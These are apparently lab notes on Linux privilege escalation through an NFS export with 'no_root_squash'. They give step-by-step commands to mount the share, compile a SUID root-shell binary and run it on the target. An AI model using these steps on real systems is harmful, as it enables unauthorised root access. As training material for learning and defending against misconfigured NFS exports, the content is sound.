[[Linux Privilege Escalation]]
**Detection**

  

Linux VM

  

1. In command line type: **cat /etc/exports**

2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

  

**Exploitation**

  

Attacker VM

  

1. Open command prompt and type: **showmount -e 10.10.241.202**

2. In command prompt type: **mkdir /tmp/1**

3. In command prompt type: **mount -o rw,vers=2 10.10.241.202:/tmp /tmp/1**

In command prompt type:

**echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c**

4. In command prompt type: **gcc /tmp/1/x.c -o /tmp/1/x**

5. In command prompt type: **chmod +s /tmp/1/x**

  

Linux VM

  

1. In command prompt type: **/tmp/x**

2. In command prompt type: **id**